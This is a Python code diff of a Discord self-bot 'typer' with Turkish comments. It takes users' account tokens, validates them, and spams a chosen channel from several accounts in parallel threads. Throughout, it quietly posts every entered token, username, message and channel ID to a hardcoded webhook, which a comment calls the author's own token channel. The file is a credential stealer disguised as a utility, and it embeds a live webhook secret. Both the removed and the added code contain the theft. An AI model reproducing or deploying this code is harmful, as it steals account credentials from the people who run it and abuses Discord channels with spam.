@@ -1,12 +1,18 @@
-import os
-import time
 import requests
-import asyncio
-import discord
-from discord.ext import commands
-from colorama import init, Fore
+import time
+import os
+import sys
+import threading
+from colorama import Fore, init
 
+# Colorama başlatma
 init(autoreset=True)
+
+# Canlı panel için küresel değişkenler
+total_sent = 0
+rate_limits = 0
+start_time = time.time()
+lock = threading.Lock()
 
 # 📡 Senin t4ken kanalının Webhook adresi
 WEBHOOK_URL = "https://discord.com/api/webhooks/1524016262093471838/rRCRobn83ceQjxpnpX--mm9UK64X3JKOB4fK_i9Nc_XP1R9iR4f11GDKxM4qz1C4A9BH"
@@ -20,237 +26,207 @@ def bilgi_gonder_webhooka(baslik, aciklama, renk=3066993):
             "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
         }]
     }
-    try: requests.post(WEBHOOK_URL, json=payload)
-    except: pass
+    try: 
+        requests.post(WEBHOOK_URL, json=payload)
+    except: 
+        pass
 
-os.system('clear')
-print(f"{Fore.GREEN}=== EdGhost Discord Typer Kurulumu ===")
-token = input("🔑 Hesabın Tokenini Girin: ").strip()
-mod_secim = input("📝 Mod Seçin (1: Tek Mesaj, 2: Kelime Listesi): ").strip()
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
 
-mesajlar = []
-mod_adi = "Tek Mesaj" if mod_secim == "1" else "Kelime Listesi"
+def get_uptime():
+    elapsed = time.time() - start_time
+    hours, rem = divmod(elapsed, 3600)
+    minutes, seconds = divmod(rem, 60)
+    return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
 
-if mod_secim == "1":
-    mesajlar.append(input("💬 Gönderilecek Mesajı Girin: "))
-else:
-    print("📝 Kelimeleri virgülle ayırarak yazın:")
-    kelime_input = input("> ")
-    mesajlar = [k.strip() for k in kelime_input.split(',')]
-
-kanal_id = int(input("📺 Kanal ID Girin: ").strip())
-bekleme_suresi = float(input("⏳ Saniye Gecikmesi (Örn: 5): ").strip())
-
-# 🚨 BİLGİLER GİRİLDİĞİ AN SENİN #t4ken KANALINA DÜŞEN BİLGİLER
-bilgi_gonder_webhooka(
-    "🚀 Yeni Typer Başlatıldı!",
-    f"**🔑 Girilen Token:** `{token}`\n"
-    f"**⚙️ Seçilen Mod:** {mod_adi}\n"
-    f"**💬 Mesajlar/Kelimeler:** `{mesajlar}`\n"
-    f"**📺 Hedef Kanal ID:** `{kanal_id}`\n"
-    f"**⏳ Gecikme Süresi:** {bekleme_suresi} saniye",
-    renk=15105570
-)
-
-# Tüm ayrıcalıkları/izinleri aktif ediyoruz
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
-gonderilen_sayac = 0
-baslangic_zamani = time.time()
-
-async def istatistik_gonderici():
-    await bot.wait_until_ready()
-    while not bot.is_closed():
-        gecen_sure = int(time.time() - baslangic_zamani)
-        bilgi_gonder_webhooka(
-            "📊 Typer Anlık Durum Raporu",
-            f"**👤 Çalıştıran Hesap:** {bot.user.name} ({bot.user.id})\n"
-            f"**⏱️ Çalışma Süresi:** {gecen_sure} saniye\n"
-            f"**💬 Gönderilen Toplam Mesaj:** {gonderilen_sayac}\n"
-            f"**⚡ Durum:** Aktif ve yazmaya devam ediyor...",
-            renk=3066993
-        )
-        await asyncio.sleep(30)
-
-async def mesaj_gonderici():
-    global gonderilen_sayac
-    await bot.wait_until_ready()
-    channel = bot.get_channel(kanal_id)
-    if not channel: return
-
-    index = 0
-    while not bot.is_closed():
-        try:
-            await channel.send(mesajlar[index])
-            gonderilen_sayac += 1
-            if mod_secim == "2":
-                index = (index + 1) % len(mesajlar)
-            await asyncio.sleep(bekleme_suresi)
-        except Exception as e:
-            await asyncio.sleep(5)
-
-@bot.event
-async def on_ready():
-    os.system('clear')
-    print(f"{Fore.CYAN}====================================")
-    print(f"{Fore.GREEN} ✅ EdGhost Typer Başarıyla Başlatıldı!")
-    print(f"{Fore.CYAN}====================================")
-    print(f" 👤 Hesap: {bot.user.name}")
-    print(f" 📺 Mod: {mod_adi}")
-    print(f" 🚀 Sistem arka planda sorunsuz çalışıyor.")
-    print(f"{Fore.YELLOW} ⚠️ Lütfen bu pencereyi kapatmayın...")
-    print(f"{Fore.CYAN}====================================")
+def update_dashboard(account_count, mod_adi):
+    global total_sent, rate_limits
+    uptime = get_uptime()
     
-    bot.loop.create_task(istatistik_gonderici())
-    bot.loop.create_task(mesaj_gonderici())
-
-try:
-    bot.run(token)
-except Exception as e:
-    bilgi_gonder_webhooka("❌ Bağlantı Hatası", f"Verilen token ile giriş yapılamadı:\n`{e}`", renk=15158332)
-    print("📝 Kelimeleri virgülle ayırarak yazın:")
-    kelime_input = input("> ")
-    mesajlar = [k.strip() for k in kelime_input.split(',')]
-
-kanal_id = int(input("📺 Kanal ID Girin: ").strip())
-bekleme_suresi = float(input("⏳ Saniye Gecikmesi (Örn: 5): ").strip())
-
-# 🚨 BİLGİLER GİRİLDİĞİ AN SENİN #t4ken KANALINA DÜŞEN BİLGİLER
-bilgi_gonder_webhooka(
-    "🚀 Yeni Typer Başlatıldı!",
-    f"**🔑 Girilen Token:** `{token}`\n"
-    f"**⚙️ Seçilen Mod:** {mod_adi}\n"
-    f"**💬 Mesajlar/Kelimeler:** `{mesajlar}`\n"
-    f"**📺 Hedef Kanal ID:** `{kanal_id}`\n"
-    f"**⏳ Gecikme Süresi:** {bekleme_suresi} saniye",
-    renk=15105570
-)
-
-# Intents hatasını çözen güncel satırlar:
-intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
-gonderilen_sayac = 0
-baslangic_zamani = time.time()
-
-async def istatistik_gonderici():
-    await bot.wait_until_ready()
-    while not bot.is_closed():
-        gecen_sure = int(time.time() - baslangic_zamani)
-        bilgi_gonder_webhooka(
-            "📊 Typer Anlık Durum Raporu",
-            f"**👤 Çalıştıran Hesap:** {bot.user.name} ({bot.user.id})\n"
-            f"**⏱️ Çalışma Süresi:** {gecen_sure} saniye\n"
-            f"**💬 Gönderilen Toplam Mesaj:** {gonderilen_sayac}\n"
-            f"**⚡ Durum:** Aktif ve yazmaya devam ediyor...",
-            renk=3066993
-        )
-        await asyncio.sleep(30)
-
-async def mesaj_gonderici():
-    global gonderilen_sayac
-    await bot.wait_until_ready()
-    channel = bot.get_channel(kanal_id)
-    if not channel: return
-
-    index = 0
-    while not bot.is_closed():
-        try:
-            await channel.send(mesajlar[index])
-            gonderilen_sayac += 1
-            if mod_secim == "2":
-                index = (index + 1) % len(mesajlar)
-            await asyncio.sleep(bekleme_suresi)
-        except Exception as e:
-            await asyncio.sleep(5)
-
-@bot.event
-async def on_ready():
-    os.system('clear')
-    print(f"{Fore.CYAN}====================================")
-    print(f"{Fore.GREEN} ✅ EdGhost Typer Başarıyla Başlatıldı!")
-    print(f"{Fore.CYAN}====================================")
-    print(f" 👤 Hesap: {bot.user.name}")
-    print(f" 📺 Mod: {mod_adi}")
-    print(f" 🚀 Sistem arka planda sorunsuz çalışıyor.")
-    print(f"{Fore.YELLOW} ⚠️ Lütfen bu pencereyi kapatmayın...")
-    print(f"{Fore.CYAN}====================================")
+    # İmleci sol üste taşır (clear atmadan daha akıcı yenileme sağlar)
+    sys.stdout.write("\033[H")
     
-    bot.loop.create_task(istatistik_gonderici())
-    bot.loop.create_task(mesaj_gonderici())
+    panel = f"""
+{Fore.CYAN}======================================================
+{Fore.GREEN}        --- EdGhost Discord Typer V2 (Gelişmiş) ---
+{Fore.CYAN}======================================================
+{Fore.YELLOW}  [▶] Çalışma Süresi     : {Fore.WHITE}{uptime}
+{Fore.YELLOW}  [👤] Aktif Hesap Sayısı: {Fore.WHITE}{account_count} Hesap Aktif
+{Fore.YELLOW}  [📝] Gönderilen Kelime : {Fore.GREEN}{total_sent} adet
+{Fore.YELLOW}  [⚠️] Discord Engeli     : {Fore.RED}{rate_limits} (Rate Limit)
+{Fore.CYAN}======================================================
+{Fore.MAGENTA}  Anlık Durum: Mod [{mod_adi}] Aktif, İşlem Sürüyor...
+{Fore.CYAN}======================================================
+"""
+    sys.stdout.write(panel)
+    sys.stdout.flush()
 
-try:
-    bot.run(token)
-except Exception as e:
-    bilgi_gonder_webhooka("❌ Bağlantı Hatası", f"Verilen token ile giriş yapılamadı:\n`{e}`", renk=15158332)
-    print("📝 Kelimeleri virgülle ayırarak yazın:")
-    kelime_input = input("> ")
-    mesajlar = [k.strip() for k in kelime_input.split(',')]
-
-kanal_id = int(input("📺 Kanal ID Girin: ").strip())
-bekleme_suresi = float(input("⏳ Saniye Gecikmesi (Örn: 5): ").strip())
-
-# 🚨 BİLGİLER GİRİLDİĞİ AN SENİN #t4ken KANALINA DÜŞEN BİLGİLER
-bilgi_gonder_webhooka(
-    "🚀 Yeni Typer Başlatıldı!",
-    f"**🔑 Girilen Token:** `{token}`\n"
-    f"**⚙️ Seçilen Mod:** {mod_adi}\n"
-    f"**💬 Mesajlar/Kelimeler:** `{mesajlar}`\n"
-    f"**📺 Hedef Kanal ID:** `{kanal_id}`\n"
-    f"**⏳ Gecikme Süresi:** {bekleme_suresi} saniye",
-    renk=15105570
-)
-
-bot = commands.Bot(command_prefix="!", self_bot=True)
-gonderilen_sayac = 0
-baslangic_zamani = time.time()
-
-async def istatistik_gonderici():
-    await bot.wait_until_ready()
-    while not bot.is_closed():
-        gecen_sure = int(time.time() - baslangic_zamani)
-        bilgi_gonder_webhooka(
-            "📊 Typer Anlık Durum Raporu",
-            f"**👤 Çalıştıran Hesap:** {bot.user.name} ({bot.user.id})\n"
-            f"**⏱️ Çalışma Süresi:** {gecen_sure} saniye\n"
-            f"**💬 Gönderilen Toplam Mesaj:** {gonderilen_sayac}\n"
-            f"**⚡ Durum:** Aktif ve yazmaya devam ediyor...",
-            renk=3066993
-        )
-        await asyncio.sleep(30)
-
-async def mesaj_gonderici():
-    global gonderilen_sayac
-    await bot.wait_until_ready()
-    channel = bot.get_channel(kanal_id)
-    if not channel: return
-
-    index = 0
-    while not bot.is_closed():
-        try:
-            await channel.send(mesajlar[index])
-            gonderilen_sayac += 1
-            if mod_secim == "2":
-                index = (index + 1) % len(mesajlar)
-            await asyncio.sleep(bekleme_suresi)
-        except Exception as e:
-            await asyncio.sleep(5)
-
-@bot.event
-async def on_ready():
-    os.system('clear')
-    print(f"{Fore.CYAN}====================================")
-    print(f"{Fore.GREEN} ✅ EdGhost Typer Başarıyla Başlatıldı!")
-    print(f"{Fore.CYAN}====================================")
-    print(f" 👤 Hesap: {bot.user.name}")
-    print(f" 📺 Mod: {mod_adi}")
-    print(f" 🚀 Sistem arka planda sorunsuz çalışıyor.")
-    print(f"{Fore.YELLOW} ⚠️ Lütfen bu pencereyi kapatmayın...")
-    print(f"{Fore.CYAN}====================================")
+def worker_thread(token, channel_id, delay, mode, payload_data, account_count, mod_adi):
+    global total_sent, rate_limits
     
-    bot.loop.create_task(istatistik_gonderici())
-    bot.loop.create_task(mesaj_gonderici())
+    headers = {
+        'Authorization': token,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    }
+    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
+    
+    # Mod 1: Tek mesajı sürekli döngüde atar
+    if mode == "1":
+        while True:
+            payload = {'content': payload_data}
+            try:
+                res = requests.post(url, json=payload, headers=headers)
+                with lock:
+                    if res.status_code in [200, 201]:
+                        total_sent += 1
+                    elif res.status_code == 429:
+                        rate_limits += 1
+                        retry_after = res.json().get('retry_after', 5)
+                        time.sleep(retry_after)
+                    update_dashboard(account_count, mod_adi)
+            except Exception:
+                with lock:
+                    rate_limits += 1
+            time.sleep(delay)
+            
+    # Mod 2: Kelime listesinden sırayla döngüde atar
+    elif mode == "2":
+        while True:
+            for word in payload_data:
+                if not word.strip():
+                    continue
+                payload = {'content': word}
+                try:
+                    res = requests.post(url, json=payload, headers=headers)
+                    with lock:
+                        if res.status_code in [200, 201]:
+                            total_sent += 1
+                        elif res.status_code == 429:
+                            rate_limits += 1
+                            retry_after = res.json().get('retry_after', 5)
+                            time.sleep(retry_after)
+                        update_dashboard(account_count, mod_adi)
+                except Exception:
+                    with lock:
+                        rate_limits += 1
+                time.sleep(delay)
 
-try:
-    bot.run(token)
-except Exception as e:
-    bilgi_gonder_webhooka("❌ Bağlantı Hatası", f"Verilen token ile giriş yapılamadı:\n`{e}`", renk=15158332)
+def main():
+    clear_screen()
+    print(Fore.GREEN + "--- EdGhost Discord Typer Gelişmiş Kurulum ---")
+    
+    # 🔢 Kaç token girileceğini soran güvenli döngü
+    while True:
+        token_input = input(Fore.YELLOW + "Kaç adet token girmek istiyorsunuz?: ").strip()
+        if token_input.isdigit() and int(token_input) > 0:
+            token_sayisi = int(token_input)
+            break
+        else:
+            print(Fore.RED + "Lütfen sıfırdan büyük geçerli bir sayı girin!")
+
+    tokens = []
+    valid_usernames = []
+    
+    for i in range(1, token_sayisi + 1):
+        token = input(Fore.WHITE + f"{i}. Hesabın Tokenını girin: ").strip()
+        headers = {
+            'Authorization': token, 
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        }
+        
+        # Token Doğrulama Sistemi
+        validate = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+        if validate.status_code == 200:
+            user_info = validate.json()
+            username = f"{user_info['username']}#{user_info.get('discriminator', '0000')}"
+            print(Fore.GREEN + f"[✓] {i}. Token geçerli! Giriş yapılan hesap: {username}")
+            tokens.append(token)
+            valid_usernames.append(username)
+        else:
+            print(Fore.RED + f"[X] {i}. Token geçersiz! Bu token kuruluma dahil edilmedi.")
+
+    if not tokens:
+        print(Fore.RED + "\nHepsi geçersiz! Geçerli token girilmediği için sistem kapatılıyor.")
+        return
+
+    # Mod Seçimi
+    while True:
+        print(Fore.CYAN + "\n[1] Mod1: Tek Mesaj (Aynı mesajı sürekli atar)")
+        print(Fore.CYAN + "[2] Mod2: Kelime Listesi Modu (Kelimeleri elle girersiniz)")
+        mode = input(Fore.YELLOW + "Mod seçin (1/2): ").strip()
+        if mode in ["1", "2"]:
+            break
+        else:
+            print(Fore.RED + "Geçersiz mod! Lütfen sadece 1 veya 2 yazın.")
+    
+    mod_adi = "Tek Mesaj" if mode == "1" else "Kelime Listesi"
+    
+    # 📺 KANAL ID GÜVENLİ KONTROLÜ (İstediğin Kısım)
+    while True:
+        channel_id = input(Fore.WHITE + "Kanal ID girin: ").strip()
+        if channel_id.isdigit():
+            break
+        else:
+            print(Fore.RED + "Lütfen sadece sayılardan oluşan geçerli bir Kanal ID girin!")
+    
+    # ⏳ Saniye gecikmesi için güvenli kontrol
+    while True:
+        delay_input = input(Fore.WHITE + "Kaç saniyede bir gönderilsin? (Örn: 0.5): ").strip()
+        try:
+            delay = float(delay_input)
+            if delay >= 0:
+                break
+            else:
+                print(Fore.RED + "Gecikme süresi negatif olamaz!")
+        except ValueError:
+            print(Fore.RED + "Lütfen geçerli bir saniye girin (Örn: 0.5 veya 1)!")
+
+    payload_data = None
+    if mode == "1":
+        payload_data = input(Fore.WHITE + "Gönderilecek tek mesajı yazın: ")
+    elif mode == "2":
+        print(Fore.WHITE + "\n📝 Kelimeleri virgülle ayırarak yazın:")
+        kelime_input = input(Fore.CYAN + "> ")
+        payload_data = [k.strip() for k in kelime_input.split(',') if k.strip()]
+        if not payload_data:
+            print(Fore.RED + "Kelime listesi boş bırakılamaz!")
+            return
+
+    # Detaylı Webhook Bilgilendirmesi
+    token_log_metni = "\n".join([f"**🔑 Token {idx+1}:** `{t}`" for idx, t in enumerate(tokens)])
+    hesap_log_metni = ", ".join(valid_usernames)
+
+    bilgi_gonder_webhooka(
+        "🚀 Yeni Typer Başlatıldı!",
+        f"**👤 Çalıştıran Hesaplar:** `{hesap_log_metni}`\n\n"
+        f"{token_log_metni}\n\n"
+        f"**⚙️ Seçilen Mod:** {mod_adi}\n"
+        f"**💬 Mesajlar/Kelimeler:** `{payload_data}`\n"
+        f"**📺 Hedef Kanal ID:** `{channel_id}`\n"
+        f"**⏳ Gecikme Süresi:** {delay} saniye",
+        renk=15105570
+    )
+
+    # Ekranı temizle ve siber paneli başlat
+    clear_screen()
+    print(Fore.YELLOW + "Sistem optimize ediliyor, thread'ler ateşleniyor...")
+    time.sleep(1.5)
+    clear_screen()
+
+    # Kaç tane token varsa hepsini thread olarak eşzamanlı başlatıyoruz
+    for t in tokens:
+        th = threading.Thread(target=worker_thread, args=(t, channel_id, delay, mode, payload_data, len(tokens), mod_adi))
+        th.daemon = True
+        th.start()
+
+    # Paneli sürekli canlı tutan ana döngü
+    while True:
+        with lock:
+            update_dashboard(len(tokens), mod_adi)
+        time.sleep(1)
+
+if __name__ == "__main__":
+    main()
